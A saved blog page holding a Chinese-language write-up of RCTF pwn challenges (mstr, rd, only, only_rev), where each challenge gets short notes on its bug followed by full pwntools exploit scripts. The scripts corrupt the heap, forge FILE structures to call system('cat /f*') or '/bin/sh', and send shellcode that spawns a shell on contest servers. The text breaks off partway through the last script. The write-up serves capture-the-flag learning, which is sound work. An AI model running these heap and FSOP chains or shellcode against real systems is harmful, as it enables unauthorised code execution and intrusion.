@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />            
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <title>RCTF pwn方向题解（缺bbox） - imiab - 博客园</title>
+    
+    <meta name="description" content="mstr python pwn 漏洞和python内部的机制有关系，python对象并不直接存储对象，而是存储对象的引用。而mutableString类的data是string，max_size_str也是string。这就会导致data和max_size_str指向同一个字符对象。 至此还不会产生" />    
+    <meta property="og:description" content="mstr python pwn 漏洞和python内部的机制有关系，python对象并不直接存储对象，而是存储对象的引用。而mutableString类的data是string，max_size_str也是string。这就会导致data和max_size_str指向同一个字符对象。 至此还不会产生" />
+    <meta property="og:image" content="https://assets.cnblogs.com/images/wechat-share.jpg" />
+    <meta property="bytedance:published_time" content="2025-11-22T00:21:32+08:00" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=6O_Ku8w_jYd3yw2BX9ElmxGv25AYbAQ-F6ZeOeZfxYc" />
+    
+    <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="/css/hljs/cnblogs.css?v=5J1NDtbnnIr2Rc2SdhEMlMxD4l9Eydj88B31E7_NhS4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/undefined/custom.css?v=M8To7qEiClk5j8&#x2B;gr6sf&#x2B;xNi&#x2B;ok=" />
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/css/mobile-common.min.css?v=a5tjm35tHR3Bq88JZf8V-jiXDhgs5wg823qWgRI6uRY" />
+    
+    <link id="favicon" rel="icon" type="image/x-icon" sizes="32x32" href="https://assets.cnblogs.com/favicon_v3_3.ico" />
+    <link id="favicon_svg" rel="icon" type="image/svg+xml" href="https://assets.cnblogs.com/favicon_v3_3.svg" />
+    <link rel="apple-touch-icon" href="https://assets.cnblogs.com/apple-touch-icon.png?v=2" />
+    <link rel="canonical" href="https://www.cnblogs.com/undefined/p/19254887" />
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/undefined/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/undefined/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/undefined/wlwmanifest.xml" />
+    
+    <script type="application/ld&#x2B;json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BlogPosting",
+      "@id": "https://www.cnblogs.com/undefined/p/19254887",
+      "headline": "RCTF pwn方向题解（缺bbox）",
+      "description": "mstr python pwn 漏洞和python内部的机制有关系，python对象并不直接存储对象，而是存储对象的引用。而mutableString类的data是string，max_size_str也是string。这就会导致data和max_size_str指向同一个字符对象。 至此还不会产生",
+      "image": [
+        
+      ],
+      "author": {
+        "@type": "Person",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "imiab",
+        "url": "https://www.cnblogs.com/undefined/"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://www.cnblogs.com/",
+        "name": "博客园",
+        "url": "https://www.cnblogs.com/"
+      },
+      "datePublished": "2025-11-22T00:22:00.0000000&#x2B;08:00",
+      "dateModified": "2025-11-22T00:22:00.0000000&#x2B;08:00",
+      "wordCount": "22227",
+      "isPartOf": {
+        "@type": "Blog",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "undefined",
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://www.cnblogs.com/",
+          "name": "博客园"
+        }
+      }
+    }
+    </script>
+
+    <script>
+        var currentBlogId = 841504;
+        var currentBlogApp = 'undefined';
+        var isLogined = false;
+        var isBlogOwner = false;
+        window.isCorp = false;
+        window.skinName = 'Custom';
+        var visitorUserId = '';
+        window.hasCustomScript = true;
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 1;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false;        
+    </script>
+        <script>
+            window.currentPostId = 19254887;
+            window.currentPostDateAdded = '2025-11-22 00:22';
+        </script>
+    <script src="https://assets.cnblogs.com/scripts/jquery-3.3.1.min.js"></script>
+    <script src="https://cdn-www.cnblogs.com/js/blog-common.min.js?v=q6A5rdB3tiIeY5Vi562gBAr3OVg5t0HcQVXePY_F0qU"></script>
+        <script>updateCustomBlogReferrer();</script>
+    
+</head>
+<body class="skin-custom has-navbar">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="//assets.cnblogs.com/logo.svg" alt="博客园logo" />
+                    </a>
+                </li>
+                <li><a href="https://cnblogs.vip/">会员</a></li>
+                <li><a href="https://cnblogs.vip/store">周边</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a></li>                
+                <li><a href="https://www.cnblogs.com/cmt/p/19316348">赞助商</a></li>
+                <li><a href="https://chat2db-ai.com/" target="_blank">Chat2DB</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off" />
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                            <img class="hidden focus-visible" src="//assets.cnblogs.com/icons/enter.svg" alt="搜索" />
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById('zzk_search_input').value)">
+                                <div class="keyword-wrapper">
+                                    <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, 'undefined', document.getElementById('zzk_search_input').value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://www.cnblogs.com/my" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/message.svg" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="//assets.cnblogs.com/icons/lite-mode-on.svg" alt="简洁模式" />
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="//assets.cnblogs.com/icons/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://www.cnblogs.com/my">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="https://vip.cnblogs.com/my">会员中心</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <div id="loading"><div class="loader-inner"></div></div>
+    </div>
+
+    <div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/undefined/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/undefined">undefined</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div>
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/undefined/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/imiab">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/undefined/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div>
+	</div>
+</div>
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/undefined/p/19254887" title="发布于 2025-11-22 00:21">
+    
+
+    <span role="heading" aria-level="2">RCTF pwn方向题解（缺bbox）</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="mstr">mstr</h1>
+<p>python pwn</p>
+<p>漏洞和<code>python</code>内部的机制有关系，<code>python</code>对象并不直接存储对象，而是存储对象的引用。而<code>mutableString</code>类的<code>data</code>是<code>string</code>，<code>max_size_str</code>也是<code>string</code>。这就会导致<code>data</code>和<code>max_size_str</code>指向同一个字符对象。</p>
+<p>至此还不会产生漏洞，因为如果对<code>data</code>进行修改，<code>python</code>会创建新的对象并修改引用指针。但是此时类里面提供了一个方法可以直接修改字符数组<code>+=</code>。如果我们对一个<code>size</code>进行<code>+=</code>就会导致<code>max_size</code>超级大，从而产生一个堆溢出。</p>
+<p>然后观察堆上的情况，会发现对正常的对象进行溢出会破坏结构指针导致crush。而<code>python</code>堆结尾的内容则为全空，覆盖也不会产生影响。因此可以考虑堆喷将对象喷到堆末尾，然后再申请新的对象，从而构造出堆重叠。（<code>+=</code>方法会修改<code>string</code>对象的长度）</p>
+<p>接着通过<code>modify</code>就可以修改下一个字符对象的长度，再从堆上泄漏出<code>libcbase</code>和<code>heapbase</code>，接下来用任意写打<code>FSOP</code>即可</p>
+<pre><code class="language-python">from pwn import *
+filename = './python'
+libc = ELF("./libc.so.6")
+host= '1.95.190.154'
+port= 26000
+
+# host = '127.0.0.1'
+# port = 9999
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process([filename, './mstr.py'])
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process([filename, './mstr.py'])
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+def new(content):
+    payload = b'new ' + content
+    sla('&gt;', payload)
+
+def set_max(idx, size):
+    payload = b'set_max ' + str(size).encode() + b' ' + str(idx).encode()
+    sla('&gt;',payload)
+    
+def plus_eq(idx1, idx2):
+    payload = b'+= ' + str(idx1).encode() + b' ' + str(idx2).encode()
+    sla('&gt;', payload)
+
+def plus(idx1, idx2):
+    payload = b'+ ' + str(idx1).encode() + b' ' + str(idx2).encode()
+    sla('&gt;', payload)
+    
+def print_max(idx):
+    payload = b'print_max '+ str(idx).encode()
+    sla('&gt;', payload)
+
+def print_c(idx):
+    payload = b'print '+ str(idx).encode()
+    sla('&gt;', payload)
+    
+def modify(idx, offset, val):
+    payload = b'modify ' + str(idx).encode() + b' ' + str(offset).encode() + b' ' + str(val).encode()
+    sla('&gt;', payload)
+
+script = '''
+'''
+def pwn():
+    global p
+    p = getp()
+    new(b'9') # 0
+    new(b'8')
+
+    new(b'a'*0x300) # 2
+    new(b'b'*0x300)
+
+    for i in range(2, 0x20):
+        new(b'1'*0x80)
+
+    set_max(33, 9)
+    set_max(2, 9)
+
+    plus_eq(0, 1)
+    plus_eq(0, 1)
+    plus_eq(0, 1)
+    plus_eq(0, 1)
+
+
+    plus_eq(33, 5)
+    plus_eq(33, 5)
+    plus_eq(33, 5)
+
+    new(b'meow'*0x20) # 34
+
+    print_c(33)
+    p.recvuntil(b'1'*0x88)
+    p.recv(0x8)
+    unitype = u64(p.recv(8))
+
+    print(hex(unitype))
+    
+    # new(b'1'*0x10 + p64(0) + p64(1) + p64(unitype) + b'\xff') # 35
+    new(b'1'*0x10)
+
+    plus_eq(2, 35)
+    plus_eq(2, 35)
+    plus_eq(2, 35)
+
+    def write_at(off, content):
+        for i in range(0, 8):
+            modify(2, off+i, content[i])
+    # write_at(0x310, p64(0x241))
+    # write_at(0x318, p64(0x1))
+    write_at(0x320, p64(unitype))
+    write_at(0x328, p64(0x1000, sign='signed'))
+
+    print_c(3)
+    p.recvuntil(p64(0xd51))
+    libcbase = u64(p.recv(8)) - 0x204120
+    p.recv(8)
+    haddr = u64(p.recv(8)) - 0x9f8
+    write_at(0x328, p64(0x800000000000))
+
+    def write_at(off, content):
+        for i in range(0, 8):
+            modify(3, off+i, content[i])
+    write_at(libcbase+libc.sym['_IO_list_all'] - haddr, p64(haddr+0x100))
+
+    # 0x0    rdi             0x8   _IO_read_ptr
+    # 0x10  _IO_read_end     0x18  _IO_read_base
+    # 0x20  _IO_write_base   0x28  _IO_write_ptr
+    # 0x30  _IO_write_end    0x38  _IO_buf_base
+    # 0x40  _IO_buf_end      0x48  _IO_save_base
+    # 0x50  _IO_backup_base  0x58  _IO_save_end
+    # 0x60  _markers         0x68  _chain
+    # 0x70  _fileno          0x74  _flags2
+    # 0x78  _old_offset      0x80  _cur_column
+    # 0x82  _vtable_offset   0x83  _shortbuf
+    # 0x88  _lock            0x90  _offset
+    # 0x98  _codecvt         0xa0  _wide_data
+    # 0xa8  _freeres_list    0xb0  _freeres_buf
+    # 0xb8  __pad5           0xc0  _mode
+    # 0xc4  _unused2         0xd8  vtable
+    libc.address = libcbase
+    fake_file = haddr+0x100
+    payload = flat({
+        0x0 : 0xfbad1800,
+        0x28: 1,
+
+        0xa0: fake_file,
+        0x68: libcbase + 0x16e828,
+        0x8:  fake_file + 0x70,
+        0x78: libcbase + 0x171bd9,
+        0x70: fake_file + 0x58,
+        0x58: b'cat /f*\x00',
+        0x90: fake_file + 0x90,
+        0x98: libc.sym['system'],
+
+        0x88: libcbase + 0x205720,
+        0x10: 1,
+        0xd8 : libc.sym['_IO_wfile_jumps'],
+        0xe0 : fake_file
+    }, filler =b'\x00').ljust(0x180, b'\0')
+
+    for i in range(0, len(payload)):
+        modify(3, 0x100+i, payload[i])
+
+    print(hex(libcbase))
+    print(hex(haddr))
+    pause()
+    p.shutdown("send")
+    p.interactive()
+    # print_c(3)
+    # print_max(2)
+    # modify(2, 0x250, 0xff)
+pwn()
+</code></pre>
+<p>PS：如果发送端关闭<code>python</code>会进入<code>exit</code>流程，但是直接<code>Ctrl+C</code>同时也会关闭接收端，所以用<code>shutdown</code>只关闭接收端，远程读取<code>flag</code>后回显即可。</p>
+<h1 id="rd">rd</h1>
+<p>本题漏洞为对象<code>task</code>指针未清空。如果我们能把一个已经<code>free</code>的对象申请回来，配合<code>task_run</code>就是一个竞态堆溢出。</p>
+<p>然后就是耐心风水，泄漏堆栈地址然后打<code>FSOP</code>......（注意task-&gt;content会被写堆地址，配合前面的漏洞就是一个任意地址写堆地址）</p>
+<p>（一开始还试着劫持<code>rbp</code>打栈迁移后面发现还不如打<code>FSOP</code>...）</p>
+<pre><code class="language-python">from pwn import *
+filename = './main'
+libc = ELF("./libc.so.6")
+host= '1.95.160.168'
+port = 26001
+
+# host = '127.0.0.1'
+# port= 13331
+
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+
+
+def login(username, passwd, pads = b''):
+    pay = b'command:login\n'
+    pay += b'username:'+ username + b'\n'
+    pay += b'password:' + passwd + b'\n'
+    pay += pads
+    sl(pay)
+    p.recvuntil('user_token:')
+    x = p.recv(32)
+    print(x)
+    return x
+
+def register(username, passwd, pads = b''):
+    pay = b'command:register\n'
+    pay += b'username:'+ username + b'\n'
+    pay += b'password:' + passwd + b'\n'
+    pay += pads
+    sl(pay)
+    p.recvuntil('success')
+
+def nohup_register(username, passwd, pads = b''):
+    pay = b'command:register\n'
+    pay += b'username:'+ username + b'\n'
+    pay += b'password:' + passwd + b'\n'
+    pay += pads
+    sl(pay)
+    # p.recvuntil('success')
+
+def submit_task(token, raw_content, encrypted = 0, pads= b''):
+    content = b''
+    if encrypted:
+        for byte in raw_content:
+            content += int.to_bytes(byte ^ 0x3f)
+    else:
+        content = raw_content
+    pay = b'command:submit_task\n'
+    pay += b'user_token:' + token + b'\n'
+    pay += b'task_content:' + content + b'\n'
+    pay += pads
+    sl(pay)
+
+def deregister(token):
+    pay = b'command:deregister\n'
+    pay += b'user_token:' + token + b'\n'
+    sl(pay)
+    p.recvuntil('success')
+
+def pwn():
+    global p
+    p = getp()
+    for i in range(0, 8):
+        register(str(i).encode(), b'abcdabcd')
+    register(b'8'*0x127, b't'*0x127)
+    for i in range(9, 16):
+        register(str(i).encode(), b'abcdabcd')
+    # pause()
+    token15 = login(b'15', b'abcdabcd')
+    token14 = login(b'14', b'abcdabcd')
+    token8 = login(b'8'*0x127, b't'*0x127)
+    token7 = login(b'7', b'abcdabcd')
+
+    deregister(token8)
+    deregister(token7)
+    register(b'7', b'1')
+    register(b'8', b'abcdabcd')
+    
+    submit_task(token15, b'1'*0x127)
+    deregister(token15)
+    deregister(token14)
+    register(b'14', b'abcdabcd')
+    register(b'15', b'abcdabcd')
+    token = login(b'15', b'abcdabcd', b'1:'+b'1'*0x27)
+    submit_task(token, b'x'*0x128+p64(0x31)+b'\xc0', 1)
+
+    sleep(4)
+    libcbase = u64(login(b'8', b'abcdabcd')[-6:]+b'\x00\x00') + 0x39c8
+    print(hex(libcbase))
+    libc.address = libcbase
+    # pause()
+    #  
+    register(b'1'*0x47, b'a'*0x47)
+    register(b'101', b'abcdabcd')
+    register(b'102', b'abcdabcd')
+    register(b'103', b'abcdabcd')
+
+    token13 = login(b'13', b'abcdabcd')
+    token12 = login(b'12', b'abcdabcd')
+    token100 =login(b'1'*0x47, b'a'*0x47)
+    token101 = login(b'101', b'abcdabcd')
+    
+    deregister(token100)
+    deregister(token101)
+
+    register(b'100', b'1')
+    register(b'101', b'abcdabcd')
+
+    submit_task(token13, b'2'*0x47)
+
+    deregister(token13)
+    deregister(token12)
+    register(b'12', b'abcdabcd')
+    register(b'13', b'abcdabcd')
+    token = login(b'13', b'abcdabcd', b'1:'+b'1'*0x27)
+    
+    pay = b'y'*0x48
+    pay += p64(0x31)+b'z'*0x28
+    pay += p64(0x51)+b'a'*0x48
+    pay += p64(0x51)+b'a'*0x48
+    pay += p64(0x31)+b'o'*0x28
+    pay += p64(0x31)+b'o'*0x28
+    pay += p64(0x21)+b'm'*0x18
+    pay += p64(0x31)+p64(libc.sym['environ'])
+    submit_task(token, pay , 1)
+    
+    sleep(4)
+    binsh = libc.search('/bin/sh').__next__()
+    stack = u64(login(b'102', b'abcdabcd').split(b' ')[-1]+b'\x00\x00')
+    canary = stack - 0x1c0
+    print(hex(libcbase))
+    print(hex(stack))
+    print(hex(binsh))
+
+# -------------------------------------------- #
+
+    register(b'2'*0x57, b'd'*0x57)
+    register(b'201', b'abcdabcd')
+    register(b'202', b'abcdabcd')
+    register(b'203', b'abcdabcd')
+
+    token11 = login(b'11', b'abcdabcd')
+    token10 = login(b'10', b'abcdabcd')
+    token200 =login(b'2'*0x57, b'd'*0x57)
+    token201 = login(b'201', b'abcdabcd')
+    
+    deregister(token200)
+    deregister(token201)
+
+    register(b'200', b'1')
+    register(b'201', b'abcdabcd')
+
+    submit_task(token11, b'+'*0x57)
+
+    deregister(token11)
+    deregister(token10)
+    register(b'10', b'abcdabcd')
+    register(b'11', b'abcdabcd')
+    token = login(b'11', b'abcdabcd')
+    
+    pay = b'p'*0x58
+    pay += p64(0x31)+b'i'*0x28
+    pay += p64(0x61)+b'r'*0x58
+    pay += p64(0x61)+b't'*0x58
+    pay += p64(0x31)+b's'*0x28
+    pay += p64(0x31)+b'w'*0x28
+    pay += p64(0x21)+b'c'*0x18
+    pay += p64(0x31)+p64(libcbase + 0x203b20)+p64(binsh)+p64(binsh)+p64(0)+p64(libc.sym['stdout']-0x20)
+
+    submit_task(token, pay , 1)
+    sleep(4)
+    token = login(b'/bin/sh', b'/bin/sh').split(b' ')[-1]
+    top_chunk = u64(token[0:6]+b'\x00\x00')
+
+    # 0x0    rdi             0x8   _IO_read_ptr
+    # 0x10  _IO_read_end     0x18  _IO_read_base
+    # 0x20  _IO_write_base   0x28  _IO_write_ptr
+    # 0x30  _IO_write_end    0x38  _IO_buf_base
+    # 0x40  _IO_buf_end      0x48  _IO_save_base
+    # 0x50  _IO_backup_base  0x58  _IO_save_end
+    # 0x60  _markers         0x68  _chain
+    # 0x70  _fileno          0x74  _flags2
+    # 0x78  _old_offset      0x80  _cur_column
+    # 0x82  _vtable_offset   0x83  _shortbuf
+    # 0x88  _lock            0x90  _offset
+    # 0x98  _codecvt         0xa0  _wide_data
+    # 0xa8  _freeres_list    0xb0  _freeres_buf
+    # 0xb8  __pad5           0xc0  _mode
+    # 0xc4  _unused2         0xd8  vtable
+    fake_file = top_chunk+0x1a0
+    payload = flat({
+        0x0 : 0xfbad1800,
+
+        0xa0: fake_file,
+        0x68: libcbase + 0x16e828,
+        0x8:  fake_file + 0x70,
+        0x78: libcbase + 0x171bd9,
+        0x70: fake_file + 0x58,
+        0x58: b'/bin/sh\x00',
+        0x90: fake_file + 0x90,
+        0x98: libc.sym['system'],
+
+        0x88: libcbase + 0x205720,
+        0x10: 1,
+        0xd8 : libc.sym['_IO_wfile_jumps'] - 0x20,
+        0xe0 : fake_file
+    }, filler =b'\x00').ljust(0x180, b'\0')
+    # for i in range(0, 0x8):
+        # payload += p64(i*0x101) * 4
+    print(hex(top_chunk))
+    print(hex(libcbase))
+    print(hex(stack))
+    print(hex(binsh))
+    pause()
+    submit_task(p64(top_chunk+0x190)[0:6], payload, 1)
+
+# 0x000000000017ac2c : mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]
+# 0x000000000016c4a7 : mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x20]
+# 0x00000000001763ae : mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x28]
+# 0x000000000016da52 : mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x30]
+# 0x000000000017b837 : mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x48]
+# 0x000000000016e828 : mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 8]
+
+# 0x0000000000171d26 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x18]
+# 0x00000000001762fd : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x20]
+# 0x0000000000171bd9 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 8]
+
+    # register(p64(stack-0x11f8)*5, p64(stack-0x11f8)*5)
+    nohup_register(b'1000', b'1000')
+
+pwn()
+p.interactive()
+</code></pre>
+<h1 id="only">only</h1>
+<p><em>Man, what can I say?</em></p>
+<pre><code class="language-c">void edit()
+	if(something)
+	{
+		printf("EMPTY!!!");
+		exit(0);
+	}
+	//...
+</code></pre>
+<p>本质shellcode题，重新做出<code>read</code>就打完了</p>
+<pre><code class="language-python">from pwn import *
+filename = './chal'
+libc = ELF("./libc.so.6")
+host= '1.95.190.154'
+port= 0
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+'''
+def pwn():
+    global p
+    p = getp()
+    hex_value = 0xD0E0A0D0B0E0E0F
+    float_value = struct.unpack('d', struct.pack('Q', hex_value))[0]
+    print(f"The float value of 0x{hex_value:X} is: {float_value}")
+    sla('3.', '2')
+    sla('input', str(float_value))
+    sla(':', '1')
+    pause()
+    shellcode = asm('pop rsi;'*6 + 'mov dl,0xff; syscall') 
+    sa(':', shellcode)
+    sleep(0.5)
+    s(asm('nop;'*0x40+shellcraft.sh()))
+
+
+
+pwn()
+p.interactive()
+</code></pre>
+<h1 id="only_rev">only_rev</h1>
+<p><em>It's not funny</em></p>
+<pre><code class="language-c">void edit()
+	if(something)
+	{
+		printf("EMPTY!!!");
+		exit(0);
+	}
+	//...
+</code></pre>
+<p>本质shellcode题，重新做出read然后就打完了。</p>
+<pre><code class="language-python">from pwn import *
+filename = './chal'
+# libc = ELF("./libc.so.6")
+host= '1.95.164.64'
+port= 26000
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+e = ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+def run(mode, script = ""):
+    if "d" in mode:
+        p = gdb.debug(filename, script)
+    elif "l" in mode:
+        p = process(filename)
+    elif "r" in mode:
+        p = remote(host, port)
+    elif "a" in mode:
+        p = process(filename)
+        gdb.attach(p, script)
+    return p
+
+def getp():
+    global script
+    if len(sys.argv) == 2:
+        p = run(sys.argv[1], script)
+    else:
+        p = run("l", script)
+    return p
+
+script = '''
+go
+'''
+def pwn():
+    global p
+    p = getp()
+    
+    hex_value = 0xD0E0A0D0B0E0E0F
+    float_value = struct.unpack('d', struct.pack('Q', hex_value))[0]
+    print(f"The float value of 0x{hex_value:X} is: {float_value}")
+    sla('3.', '2')
+    sla('input', str(float_value))
+    sla(':', '1')
+    pause()
+    shellcode = '''
+syscall
+mov rsi, rcx
+mov dl, 0xff
+syscall
+'''
+    shellcode = asm(shellcode)
+    sa(':', shellcode)
+    sleep(0.5)
